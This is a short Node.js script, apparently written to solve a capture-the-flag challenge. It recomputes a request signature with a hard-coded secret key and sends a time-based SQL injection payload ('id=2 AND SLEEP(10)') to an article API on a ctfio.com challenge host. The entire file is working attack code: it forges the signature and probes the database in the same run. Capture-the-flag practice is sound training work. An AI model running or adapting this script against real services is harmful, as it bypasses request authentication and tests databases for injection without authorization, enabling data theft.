const axios = require('axios');
const sha1 = require('js-sha1');

function calculateSignature(timestamp, pathName, userId) {
    const secretKey = "pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA";

    const signatureString = [
        secretKey,
        timestamp,
        pathName,
        userId
    ].join('\n');

    return sha1(signatureString);
}

async function sendModifiedRequest() {
    const originalUrl = 'https://9svte9vs.eu1.ctfio.com/api/article?id=2%20AND%20SLEEP%2810%29';
    const path = '/api/article?id=2%20AND%20SLEEP%2810%29';

    const timestamp = Date.now().toString();
    const userId = '1234';

    const sign = calculateSignature(timestamp, path, userId);

    try {
        const response = await axios.get(originalUrl, {
            headers: {
                'Host': '9svte9vs.eu1.ctfio.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0',
                'Sign': sign,
                'Time': timestamp,
                'User-Id': userId
            }
        });

        console.log('✅ Response data:', response.data);
    } catch (error) {
        console.error('❌ Error:', error.response?.data || error.message);
    }
}

sendModifiedRequest();
